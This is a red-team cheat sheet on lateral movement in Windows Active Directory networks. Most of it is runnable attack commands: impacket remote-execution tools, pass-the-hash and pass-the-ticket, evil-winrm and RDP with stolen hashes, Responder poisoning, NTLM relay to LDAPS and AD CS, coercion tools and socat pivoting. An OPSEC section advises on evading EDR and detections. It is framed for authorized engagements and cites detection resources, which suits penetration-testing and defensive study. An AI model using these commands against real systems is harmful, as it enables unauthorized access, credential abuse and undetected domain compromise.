# Lateral Movement

Authorized engagements. MITRE: https://attack.mitre.org/tactics/TA0008/.

Assume you have: credentials (plaintext, NT hash, Kerberos TGT/TGS) + network reach to SMB/WinRM/RDP on the target.

## Protocol selection

| Protocol | Port | Needs      | Log loudness | Notes |
|----------|------|-----------|--------------|-------|
| SMB / admin$ (psexec-style) | 445 | SMB admin + service control | High (4697, 7045) | Drops service, most-watched |
| SMB (smbexec) | 445 | SMB admin | High | Noisy, no binary drop |
| WMI (wmiexec, Invoke-WmiMethod) | 135 + dyn | DCOM admin | Medium | No service drop, uses WMI |
| WinRM (evil-winrm, Enter-PSSession) | 5985/5986 | PS Remoting rights | Medium | Cleanest for admin users |
| DCOM (MMC20.Application, ShellWindows) | 135 + dyn | DCOM admin | Medium | Bypasses basic controls |
| RDP | 3389 | Remote Desktop group | High | Interactive, leaves logon events |
| SSH | 22 | Linux creds/key | Low-Medium | Linux lateral |

## impacket

Install: `pipx install impacket` or https://github.com/fortra/impacket. Ship it with uv/pipx, not global pip.

### psexec.py

```
psexec.py DOMAIN/user:'pass'@10.0.0.5
psexec.py DOMAIN/user@10.0.0.5 -hashes :NTHASHHEX
```

Drops `RemComSvc` service → `ADMIN$` share → SYSTEM shell. Very loud: 7045 + 4697 + 5140.

### smbexec.py

```
smbexec.py DOMAIN/user:'pass'@10.0.0.5
```

Creates a temp service per command; no binary drop but still 7045 spam.

### wmiexec.py

```
wmiexec.py DOMAIN/user:'pass'@10.0.0.5
wmiexec.py DOMAIN/user@10.0.0.5 -hashes :NTHASH
wmiexec.py -k -no-pass DOMAIN/user@host.domain.tld  # Kerberos from ccache
```

Semi-interactive shell via Win32_Process.Create. Quieter; events 4688 (if enabled) + 4624 type 3.

### atexec.py

Creates scheduled task remotely. Useful when WMI/SMB service creation is blocked.

```
atexec.py DOMAIN/user:'pass'@10.0.0.5 "whoami"
```

### dcomexec.py

DCOM method invocation (MMC20.Application, ShellBrowserWindow, ShellWindows). Referenced by Enigma0x3: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/.

```
dcomexec.py -object MMC20 DOMAIN/user:'pass'@10.0.0.5
```

### Pass-the-hash / pass-the-ticket

```
# PtH
psexec.py -hashes :NTHASH DOMAIN/user@host

# PtT (request TGT with hash first)
getTGT.py DOMAIN/user -hashes :NTHASH
export KRB5CCNAME=user.ccache
wmiexec.py -k -no-pass DOMAIN/user@host.domain.tld
```

`getTGT.py`, `getST.py`, `GetUserSPNs.py`, `GetNPUsers.py` — all impacket.

## WinRM

Native from a Windows foothold:

```powershell
Enter-PSSession -ComputerName dc01 -Credential (Get-Credential)
Invoke-Command -ComputerName dc01 -Credential $c -ScriptBlock {whoami}
```

From Linux:

```
evil-winrm -i 10.0.0.5 -u user -p 'pass'
evil-winrm -i 10.0.0.5 -u user -H NTHASH
```

https://github.com/Hackplayers/evil-winrm.

Detection: 5985/5986 connections, PowerShell module logging 4103/4104, WinRM operational log.

## RDP

```
xfreerdp /u:user /d:DOMAIN /p:'pass' /v:10.0.0.5 /cert:ignore /dynamic-resolution
xfreerdp /u:user /pth:NTHASH /v:10.0.0.5 /cert:ignore   # restricted admin mode
```

Restricted Admin Mode must be enabled on target (`DisableRestrictedAdmin=0`). Otherwise need full plaintext.

## NTLM relay / Responder

LLMNR/NBNS/mDNS poisoning → capture NetNTLMv2 → either crack or relay.

```
# Poison
responder -I eth0 -wvdP
# Capture hash -> crack with hashcat -m 5600
# Or relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"          # SMB -> SMB
ntlmrelayx.py -t ldaps://dc01 --escalate-user kd                # LDAPS -> AD ACL abuse
ntlmrelayx.py -t http://sccm --escalate-user kd                 # HTTP -> AD CS ESC8
```

Requirements:

- SMB signing NOT enforced on target (`smb2-signing` nmap script)
- Victim client sending to attacker (LLMNR / NBNS / mDNS / WPAD / IPv6 RA — see mitm6)

Tools:

- Responder — https://github.com/lgandx/Responder
- ntlmrelayx — impacket
- mitm6 — https://github.com/dirkjanm/mitm6
- PetitPotam, Coercer — https://github.com/p0dalirius/Coercer

Reference: https://www.thehacker.recipes/ad/movement/ntlm/relay.

## Kerberos coercion + relay

- PetitPotam (CVE-2022-26925 patched but still relevant on old DCs) — https://github.com/topotam/PetitPotam
- PrinterBug (SpoolSample) — https://github.com/leechristensen/SpoolSample
- DFSCoerce — https://github.com/Wh04m1001/DFSCoerce
- Coercer unifies them — https://github.com/p0dalirius/Coercer

Then relay to AD CS (ESC8) or LDAP with RBCD — see `ad-attacks.md`.

## Pivot / tunnel

- chisel — TCP over HTTP — https://github.com/jpillora/chisel
- ligolo-ng — TAP-based, best QoL — https://github.com/nicocha30/ligolo-ng
- sshuttle — transparent proxy — https://github.com/sshuttle/sshuttle
- socat port-forward — `socat TCP-LISTEN:4444,fork TCP:10.0.0.5:445`
- Sliver built-in port forward + socks5

## OPSEC

- Prefer WMI / DCOM over PSExec-style when EDR is strong.
- Use Kerberos (`-k`) not NTLM where possible — less likely to trip detections.
- Don't reuse the same IP as both poisoner and relayer on segmented nets.
- Mind SMB signing and LDAP signing / channel binding — modern DCs enforce.
- Skip plain PSExec on anything with EDR.

## Detection references

- Sigma ADMIN$/IPC$ rules — https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin
- Sean Metcalf AD security — https://adsecurity.org
- SpecterOps "An ACE up the sleeve" — https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf

## References

- TheHacker.Recipes Movement — https://www.thehacker.recipes/ad/movement/
- impacket — https://github.com/fortra/impacket
- MITRE TA0008 — https://attack.mitre.org/tactics/TA0008/
